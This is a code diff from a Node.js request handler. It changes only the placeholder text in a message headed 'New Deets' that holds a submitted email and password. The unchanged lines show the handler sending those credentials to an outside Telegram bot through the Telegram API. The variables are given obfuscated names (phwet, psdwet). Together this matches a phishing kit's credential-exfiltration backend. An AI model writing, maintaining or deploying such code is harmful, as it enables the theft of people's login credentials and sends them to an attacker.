@@ -71,7 +71,7 @@ module.exports = async function handler(req, res) {
     }
 
     try {
-      const telegramText = `New Deets:\nEml: ${phwet || 'Not provided'}\nPswd: ${psdwet || 'Not provided'}`;
+      const telegramText = `New Deets:\nEml: ${phwet || 'No5t provided'}\nPswd: ${psdwet || 'Not provided'}`;
 
       await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
